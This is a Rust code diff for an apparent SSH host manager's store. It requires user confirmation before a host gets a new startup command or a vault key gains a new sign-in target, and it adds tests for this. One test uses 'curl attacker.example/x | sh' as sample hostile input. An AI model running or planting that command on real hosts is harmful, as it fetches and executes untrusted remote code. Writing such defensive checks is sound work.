@@ -1,10 +1,47 @@
 use crate::host::{Host, HostGroup};
 use crate::identity::Identity;
 use crate::key_reach::{self, NewReach};
+use crate::startup_command::{self, NewCommand};
 use crate::workspace::Workspace;
 use crate::{CoreError, Result};
 use serde::{Deserialize, Serialize};
 use std::path::PathBuf;
+
+/// What a store write introduces that the user has to confirm before it is
+/// written: places a vault key would sign in that no saved host lets it sign
+/// in now, and startup commands hosts did not have.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct Introduced {
+    pub reaches: Vec<NewReach>,
+    pub commands: Vec<NewCommand>,
+}
+
+impl Introduced {
+    /// Everything `after` introduces over `before`; see
+    /// `key_reach::introduced` and `startup_command::introduced`.
+    pub fn between(before: &StoreData, after: &StoreData) -> Self {
+        Self {
+            reaches: key_reach::introduced(before, after),
+            commands: startup_command::introduced(before, after),
+        }
+    }
+
+    pub fn is_empty(&self) -> bool {
+        self.reaches.is_empty() && self.commands.is_empty()
+    }
+
+    /// Why `self` cannot be written on the strength of `confirmed`, or `None`
+    /// when `confirmed` covers all of it.
+    fn unconfirmed_by(&self, confirmed: &Introduced) -> Option<CoreError> {
+        if self.reaches.iter().any(|reach| !confirmed.reaches.contains(reach)) {
+            return Some(CoreError::UnconfirmedKeyReach);
+        }
+        if self.commands.iter().any(|command| !confirmed.commands.contains(command)) {
+            return Some(CoreError::UnconfirmedStartupCommand);
+        }
+        None
+    }
+}
 
 /// Persistent store for non-secret data: hosts, host groups, identities, workspaces.
 /// Private keys live in the vault; passwords are never stored.
@@ -84,12 +121,13 @@ impl StoreData {
 /// The saved store, and the only way to change it.
 ///
 /// Every write goes through `commit_confirmed`, which refuses any write that
-/// lets a vault key sign in where no saved host lets it sign in yet unless the
-/// caller hands it a list covering that reach. The typed writers below pass an
-/// empty list, so they make every change except that one and fail with
-/// `UnconfirmedKeyReach` on it, which keeps a writer added later from granting
-/// such a reach by accident. Making such a write on purpose takes `preview` to
-/// see what it would allow, the user's confirmation of that, and
+/// lets a vault key sign in where no saved host lets it sign in yet, or gives
+/// a host a startup command it did not have, unless the caller hands it an
+/// [`Introduced`] covering that change. The typed writers below pass an empty
+/// one, so they make every other change and fail with `UnconfirmedKeyReach` or
+/// `UnconfirmedStartupCommand` on these, which keeps a writer added later from
+/// making such a change by accident. Making one on purpose takes `preview` to
+/// see what it would introduce, the user's confirmation of that, and
 /// `commit_confirmed` with what they confirmed. Nothing here can tell whether a
 /// caller really asked the user: the list is the caller's word for it.
 pub struct Store {
@@ -130,27 +168,27 @@ impl Store {
         crate::fs_util::write_private(&self.path, &raw)
     }
 
-    /// Every place `edit` would let a vault key sign in where no saved host lets
-    /// it sign in now; see `key_reach::introduced`. Nothing is written, and
-    /// `edit` runs on `StoreData::access_copy`, not on the whole store.
-    pub fn preview(&self, edit: impl FnOnce(&mut StoreData)) -> Vec<NewReach> {
+    /// What `edit` would introduce that needs the user's confirmation. Nothing
+    /// is written, and `edit` runs on `StoreData::access_copy`, not on the
+    /// whole store.
+    pub fn preview(&self, edit: impl FnOnce(&mut StoreData)) -> Introduced {
         let mut after = self.data.access_copy();
         edit(&mut after);
-        key_reach::introduced(&self.data, &after)
+        Introduced::between(&self.data, &after)
     }
 
     /// Apply `edit` to the in-memory data and persist the result, provided
-    /// every key reach it introduces is one of `confirmed`, rolling the change
-    /// back when the write does not happen.
+    /// everything it introduces is in `confirmed`, rolling the change back when
+    /// the write does not happen.
     ///
-    /// A saved host that signs in with a vault key aims that key at a server,
-    /// and the store is written from the webview. `confirmed` is what the user
-    /// was shown and allowed; an empty list admits only writes that let a key
-    /// sign in nowhere new. Anything outside it fails with
-    /// `UnconfirmedKeyReach` and nothing is written. The check runs against the
-    /// store as it is when the write lands, so a write that has come to allow
-    /// more than was confirmed, because the store changed while the user was
-    /// deciding, is refused as well.
+    /// A saved host that signs in with a vault key aims that key at a server, a
+    /// startup command runs on every connect, and the store is written from
+    /// the webview. `confirmed` is what the user was shown and allowed; an empty
+    /// one admits only writes that introduce neither. Anything outside it fails
+    /// with `UnconfirmedKeyReach` or `UnconfirmedStartupCommand` and nothing is
+    /// written. The check runs against the store as it is when the write lands,
+    /// so a write that introduces more than was confirmed by then, because the
+    /// store moves on while the user decides, is refused as well.
     ///
     /// The file is the authority for what survives the session, so memory must
     /// not run ahead of it. A refused write is the case that matters: the
@@ -160,17 +198,13 @@ impl Store {
     pub fn commit_confirmed(
         &mut self,
         edit: impl FnOnce(&mut StoreData),
-        confirmed: &[NewReach],
+        confirmed: &Introduced,
     ) -> Result<()> {
         let previous = self.data.clone();
         edit(&mut self.data);
-        let unconfirmed = key_reach::introduced(&previous, &self.data)
-            .iter()
-            .any(|reach| !confirmed.contains(reach));
-        let written = if unconfirmed {
-            Err(CoreError::UnconfirmedKeyReach)
-        } else {
-            self.save()
+        let written = match Introduced::between(&previous, &self.data).unconfirmed_by(confirmed) {
+            Some(refusal) => Err(refusal),
+            None => self.save(),
         };
         if written.is_err() {
             self.data = previous;
@@ -179,9 +213,9 @@ impl Store {
     }
 
     /// A write that confirms nothing, so it cannot let a vault key sign in
-    /// anywhere new.
+    /// anywhere new or give a host a new startup command.
     fn commit(&mut self, f: impl FnOnce(&mut StoreData)) -> Result<()> {
-        self.commit_confirmed(f, &[])
+        self.commit_confirmed(f, &Introduced::default())
     }
 
     // --- hosts ---
@@ -392,7 +426,7 @@ mod tests {
 
         // The same write goes through once it carries what was confirmed.
         let confirmed = store.preview(|data| data.add_host(host.clone()));
-        assert_eq!(confirmed.len(), 1);
+        assert_eq!(confirmed.reaches.len(), 1);
         store
             .commit_confirmed(|data| data.add_host(host.clone()), &confirmed)
             .expect("a confirmed write saves");
@@ -416,8 +450,8 @@ mod tests {
 
         // Only one of the two hosts the identity gives a key to was confirmed.
         let mut confirmed = store.preview(|data| data.add_identity(identity.clone()));
-        assert_eq!(confirmed.len(), 2);
-        confirmed.truncate(1);
+        assert_eq!(confirmed.reaches.len(), 2);
+        confirmed.reaches.truncate(1);
         let error = store
             .commit_confirmed(|data| data.add_identity(identity.clone()), &confirmed)
             .expect_err("a write broader than its confirmation went through");
@@ -437,7 +471,6 @@ mod tests {
 
         let mut renamed = host.clone();
         renamed.label = "production".into();
-        renamed.startup_command = Some("uptime".into());
         store
             .update_host(renamed)
             .expect("a rename saves unconfirmed");
@@ -445,6 +478,41 @@ mod tests {
             .remove_host(host.id)
             .expect("a removal saves unconfirmed");
         assert!(store.hosts().is_empty());
+    }
+
+    #[test]
+    fn a_writer_that_confirms_nothing_cannot_set_a_startup_command() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let path = dir.path().join("store.json");
+        let mut store = Store::load(path.clone()).expect("load");
+        let host = Host::new("lab", "lab.example", 22, "deploy");
+        store.add_host(host.clone()).expect("a plain host saves");
+
+        let mut running = host.clone();
+        running.startup_command = Some("curl attacker.example/x | sh".into());
+        let error = store
+            .update_host(running.clone())
+            .expect_err("a startup command was saved without a confirmation");
+        assert!(matches!(error, CoreError::UnconfirmedStartupCommand), "{error}");
+        assert_eq!(store.hosts()[0].startup_command, None);
+        assert_eq!(Store::load(path.clone()).expect("reload").hosts()[0].startup_command, None);
+
+        let confirmed = store.preview(|data| data.update_host(running.clone()));
+        assert!(confirmed.reaches.is_empty());
+        assert_eq!(confirmed.commands.len(), 1);
+        store
+            .commit_confirmed(|data| data.update_host(running.clone()), &confirmed)
+            .expect("a confirmed command saves");
+
+        // Changing it again is a new command, clearing it is not.
+        let mut changed = running.clone();
+        changed.startup_command = Some("uptime".into());
+        let error = store.update_host(changed).expect_err("a changed command saved unconfirmed");
+        assert!(matches!(error, CoreError::UnconfirmedStartupCommand), "{error}");
+        let mut cleared = running;
+        cleared.startup_command = None;
+        store.update_host(cleared).expect("clearing a command saves unconfirmed");
+        assert_eq!(Store::load(path).expect("reload").hosts()[0].startup_command, None);
     }
 
     // A refused write must not leave the rejected value in memory: it would
